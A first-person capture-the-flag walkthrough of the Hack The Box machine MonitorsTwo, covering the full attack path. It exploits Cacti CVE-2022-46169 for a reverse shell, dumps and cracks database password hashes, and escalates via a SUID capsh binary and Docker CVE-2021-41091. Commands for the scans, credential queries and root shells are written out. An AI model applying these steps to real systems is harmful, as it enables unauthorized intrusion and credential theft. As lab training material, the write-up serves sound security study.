  ![image](https://user-images.githubusercontent.com/87700008/236646161-75eb7f04-736d-40bd-b071-2bfd16e50a42.png)
https://app.hackthebox.com/machines/539

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began the enumeration process by using rustscan and discovered two open ports: 22 and 80.

```
sudo rustscan -a 10.10.11.211 -- -sC -sV -vv -oN monitor2_nmap
```

![image](https://user-images.githubusercontent.com/87700008/236646587-e8465f10-58df-45b9-9bb0-cfabc39556d0.png)

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Upon checking the website, I found that port 80 was hosting a Cacti service, which is an open-source, web-based monitoring solution.
![image](https://user-images.githubusercontent.com/87700008/237025268-926927c5-8cd0-433a-a233-fa4b02ab9e07.png)

I attempted to bypass the authentication using SQLi but was unsuccessful. I also inspected the HTML source code of the website but did not find anything helpful. As the next step, I decided to scan for subdirectories.

```
ffuf -u http://10.10.11.211/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The scan results returned multiple directories, but all of them required authentication.

![image](https://user-images.githubusercontent.com/87700008/237025773-641cede3-abb7-4528-afca-14eb333c730b.png)

While browsing the webpage, I noticed that the version of Cacti being used was 1.22. This led me to search for any vulnerabilities associated with this version. I discovered that Cacti 1.22 is vulnerable to CVE-2022-46169, which has a CVSS score of 9.8. The vulnerability allows for remote code execution (RCE). Unauthenticated attackers can exploit this vulnerability if any monitored device uses a specific data source. By exploiting this vulnerability, attackers can run arbitrary commands under the same user as the web server process.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Initial access:

I came across an exploit for the CVE-2022-46169 vulnerability in this GitHub repo, which I then downloaded onto my attacking machine. After downloading the exploit, I executed it and quickly received a reverse shell in my netcat listener, with the user running as 'www-data'. 🙂

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0490e050-571d-4249-b2d1-a756c22efed3)

During the enumeration process, I noticed that I was currently within a Docker environment.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/96904852-b175-42da-aca1-9b8e5be25539)

Within the '/' folder, I came across a file called 'entrypoint.sh' for which I had read access. Upon inspecting the file, I found the following code:

```
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

Based on the code, I used root credentials to check the tables in the cacti database and found numerous tables.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9c583bff-30a1-4e3f-9531-64e71b4d7f2f)

One table caught my attention: 'user_auth'. I retrieved the details from that table using the following command:

```
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/de596dd2-62c3-4279-acc7-2b81560e2ace)

In the table I observed 3 users "admin", "guest" & "marcus" with their hashed passwords.

In the table, I noticed three users: "admin", "guest", and "marcus", along with their hashed passwords.

At this point, I added "monitorstwo.htb" to the hosts file, as the domain was visible in the database. I also checked the hashing algorithm used for Marcus' password and determined that it was in bcrypt format.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3deb5d51-24cc-415c-872d-0312955f2c19)

Using HashCat with mode 3200, I cracked the hash and obtained the clear text password in just a few seconds.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/eeeff081-b9bb-4008-b49a-1f1594be765f)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User.txt:

Using the cracked credentials, I attempted to log in via SSH and successfully accessed Marcus' account.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/73c26538-b1bf-42f3-9183-7de37832a46c)

I also obtained the user flag. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a69a5718-3ba1-40bc-8703-d9291e9238ba)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Priv Esc:

I began the enumeration process, checking for sudo privileges, cron jobs, and SUID binaries. Unfortunately, I didn't find anything helpful since Marcus isn't allowed to run programs as sudo or listed in the sudoers list. 😕

To continue the enumeration, I transferred the Linpeas binary to further explore privilege escalation possibilities. During Linpeas' execution, I discovered an interesting folder belonging to Marcus, which contained an email from the security team.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/301db084-cbce-44ff-8aba-40cc24d3e6c8)

In the email, I found information about three vulnerabilities, with one catching my attention: **"CVE-2021-41091."**

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/320817d7-9ea6-4d47-abc3-68292492ed41)

```
CVE-2021-41091 refers to overly permissive directory permissions in /var/lib/docker/overlay2, which allows unprivileged users to access and execute programs within containers, potentially leading to privilege escalation. In other words, if we create a file with root permissions inside a container, we can execute the same file on the host machine with root privileges, even without having root access.
```

To exploit this vulnerability, we need to escalate privileges within the container environment as well. 
To do this, I ran Linpeas inside the container and discovered the "capsh" binary with the setuid permission, which we can leverage for privilege escalation.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/653b1352-4b4c-4a12-99f0-32c847e9fa68)

I executed the following command as 'www-data' and quickly obtained a root shell:

```
capsh --gid=0 --uid=0 --
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c994f6d6-029e-4cb2-a140-daf8027f39de)

After gaining a root shell in the container, I created a root bash shell in the /tmp folder.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b0806c37-a7fb-4e15-9744-97eb1e5a9e24)

Regarding the full vulnerability description:

```
The overlay filesystem plays a crucial role in exploiting this vulnerability. Docker's overlay filesystem allows the container's file system to be layered on top of the host's file system, enabling the host system to access and manipulate files within the container. In the case of CVE-2021-41091, overly permissive directory permissions in /var/lib/docker/overlay2 allow unprivileged users to access and execute programs within the containers, potentially leading to privilege escalation attacks.
```

I used 'findmnt' to search for the overlay filesystem.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a92c43b3-458c-4152-85dd-584587d011ca)

Next, I checked if my SUID bash was visible from the host machine, which indeed it was.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0c9aea7b-cbcc-443d-af85-549c62db54c1)

Executed the 'bash -p' & got the root shell quickly: (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5decf271-bc1c-4143-b4a4-427376f158f9)
